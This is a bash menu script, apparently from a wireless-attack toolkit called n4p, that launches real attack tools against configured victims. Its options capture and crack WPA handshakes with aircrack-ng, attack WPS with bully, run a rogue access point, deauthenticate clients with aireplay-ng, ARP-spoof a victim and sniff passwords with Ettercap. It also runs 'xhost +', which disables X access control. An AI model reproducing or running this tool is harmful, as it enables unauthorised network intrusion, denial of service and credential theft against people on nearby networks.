#!/bin/bash
if [[ $(id -u) != 0 ]]; then # Verify we are not root
	xhost +
else
   echo "This script can not be ran as root or with sudo." 1>&2
   exit 1
fi

#retrieve absolute path structures so we can use symlinks and config files
SOURCE="${BASH_SOURCE[0]}"
while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
    DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
    SOURCE="$(readlink "$SOURCE")"
    [[ $SOURCE != /* ]] && SOURCE="${DIR}/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
DIR_CONF=/etc/n4p
DIR_LOGO=/usr/share/n4p

get_name()
{
    USE=$(grep $1 ${DIR_CONF}/n4p.conf | awk -F= '{print $2}')
}

# Text color variables
TXT_BLD=$(tput bold)             # Bold
BLD_BLU=${txtbld}$(tput setaf 4) # blue
BLD_TEA=${txtbld}$(tput setaf 6) # teal
BLD_WHT=${txtbld}$(tput setaf 7) # white
PUR=$(tput setaf 5)              # purple
TXT_RST=$(tput sgr0)             # Reset
EYES=$(tput setaf 6)
AP_GATEWAY=$(grep routers ${DIR_CONF}/dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
get_name "IFACE1="; IFACE1=$USE
MON="${IFACE1}mon"

echo "${BLD_TEA}$(cat ${DIR_LOGO}/opening.logo)${TXT_RST}"; sleep 1

sessionfolder=/tmp/n4p # Set our tmp working configuration directory and then build config files
[ ! -d "$sessionfolder" ] && mkdir "$sessionfolder"; mkdir -p "$sessionfolder" "${sessionfolder}/logs"

menu()
{

    echo -e "\n"
    echo -e "${BLD_WHT}
               /\#/\         '\\-//\`       |.===. '   
              /(${TXT_RST}${EYES}o o${TXT_RST}${BLD_WHT})\        (${EYES}o o${TXT_RST}${BLD_WHT})        ${TXT_RST}${PUR}{}${TXT_RST}${EYES}o o${TXT_RST}${PUR}{}${TXT_RST}${BLD_WHT}  
    +======ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo======+
    | ${TXT_RST}${BLD_TEA}1${TXT_RST}${BLD_WHT})  Set devices for use and attack                  |
    | ${TXT_RST}${BLD_TEA}2${TXT_RST}${BLD_WHT})  Perform wifi radius recon                       |
    | ${TXT_RST}${BLD_TEA}3${TXT_RST}${BLD_WHT})  Airodump-ng .cap file or Wash network           |
    | ${TXT_RST}${BLD_TEA}4${TXT_RST}${BLD_WHT})  Crack .cap and hashes                           |
    | ${TXT_RST}${BLD_TEA}5${TXT_RST}${BLD_WHT})  Launch AP or Attack                             |
    | ${TXT_RST}${BLD_TEA}6${TXT_RST}${BLD_WHT})  Enumerate the Firewall ${TXT_RST}${BLD_TEA}(Run this option last)${TXT_RST}${BLD_WHT}   |
    | ${TXT_RST}${BLD_TEA}7${TXT_RST}${BLD_WHT})  Kick everyone                                   |
    | ${TXT_RST}${BLD_TEA}8${TXT_RST}${BLD_WHT})  Start Ettercap Sniffer                          |
    | ${TXT_RST}${BLD_TEA}9${TXT_RST}${BLD_WHT})  ARP the Network                                 |
    | ${TXT_RST}${BLD_TEA}0${TXT_RST}${BLD_WHT})  EXIT                                            |
    +=====================================================+${TXT_RST}"
    read -p "Option: " choice
    if [[ $choice == 0 ]]; then
        killemAll
    elif [[ $choice == 1 ]]; then
        sudo nano /etc/n4p/n4p.conf
    elif [[ $choice == 2 ]]; then
        get_name "IFACE1="; IFACE1=$USE
        sudo xterm -bg black -fg blue -T "Recon" -geometry 90x20 -e ${DIR}/./recon.sh $IFACE1 recon &>/dev/null &
    elif [[ $choice == 3 ]]; then
        get_name "IFACE1="; IFACE1=$USE
        get_name "ATTACK="; ATTACK=$USE
        if [[ $ATTACK == 'WPS' ]]; then
            sudo xterm -bg black -fg blue -T "Wash" -geometry 90x20 -e ${DIR}/./recon.sh $IFACE1 wash &>/dev/null &
        else
            sudo xterm -bg black -fg blue -T "Dump cap" -geometry 90x20 -e ${DIR}/./recon.sh $IFACE1 dump &>/dev/null &
        fi
    elif [[ $choice == 4 ]]; then
        get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
        get_name "WORD_LIST="; WORD_LIST=$USE
        get_name "CRACK="; CRACK=$USE
        if [[ $CRACK == "Aircrack-ng" ]]; then
            sudo xterm -hold -bg black -fg blue -T "Cracking" -geometry 90x20 -e aircrack-ng ${sessionfolder}/${VICTIM_BSSID}-01.cap -w $WORD_LIST &>/dev/null &
        else
            echo "CRACK= configuration error, check config file"
        fi
    elif [[ $choice == 5 ]]; then
        get_name "ATTACK="; ATTACK=$USE
        if [[ $ATTACK != 'WPS' ]]; then
            sudo xterm -bg black -fg blue -T "Airbase" -geometry 90x20 -e ${DIR}/./n4p_main.sh &>/dev/null &
        elif [[ $ATTACK == "WPS" ]]; then
            sudo xterm -bg black -fg blue -T "Bully" -geometry 90x20 -e ${DIR}/./recon.sh $IFACE1 bully &>/dev/null &
        fi
    elif [[ $choice == 6 ]]; then
    	sudo xterm -bg black -fg blue -T "iptables" -geometry 90x20 -e ${DIR}/./n4p_iptables.sh &>/dev/null &
    elif [[ $choice == 7 ]]; then
        get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
        get_name "STATION="; STATION=$USE
        get_name "IFACE1="; IFACE1=$USE
        MON="${IFACE1}mon"
        sudo xterm -bg black -fg blue -T "Aireplay" -geometry 90x20 -e aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon &>/dev/null &
    elif [[ $choice == 8 ]]; then
        get_name "BRIDGE_NAME="; BR_NAME=$USE
        get_name "AP="; AP_NAME=$USE
        get_name "BRIDGED="; BRIDGED=$USE
        [[ ! -f ${sessionfolder}/recovered_passwords.pcap ]] && sudo touch ${sessionfolder}/recovered_passwords.pcap
        get_name "ETTERCAP_OPTIONS="; ETTERCAP_OPTIONS=$USE
        if [[ $BRIDGED == "True" ]]; then
          sudo xterm -T "ettercap $BR_NAME" -geometry 90x20 -e ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} &>/dev/null &
        elif [[ $AP_NAME == "AIRBASE" ]]; then
           sudo xterm -T "ettercap at0" -geometry 90x20 -e ettercap -i at0 ${ETTERCAP_OPTIONS} -w ${sessionfolder}/recovered_passwords.pcap &>/dev/null &
        #elif [[ $AP_NAME == "HOSTAPD" ]]; then
        #   sudo xterm -T "ettercap $IFACE1" -geometry 90x20 -e ettercap $ETTERCAP_OPTIONS -i $IFACE1 -w ${sessionfolder}/recovered_passwords.pcap &>/dev/null &
        fi
    elif [[ $choice == 9 ]]; then
        get_name "IFACE1="; IFACE1=$USE
        get_name "ARP_VICTIM="; ARP_VICTIM=$USE
        sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
    else
    	echo "Invald Option"
    	menu
    fi
    clear; menu
}

killemAll()
{
    echo ""
    xhost -
    echo "${BLD_TEA}$(cat ${DIR_LOGO}/zed.logo)${TXT_RST}"
    exit 0
}

trap killemAll INT HUP;
menu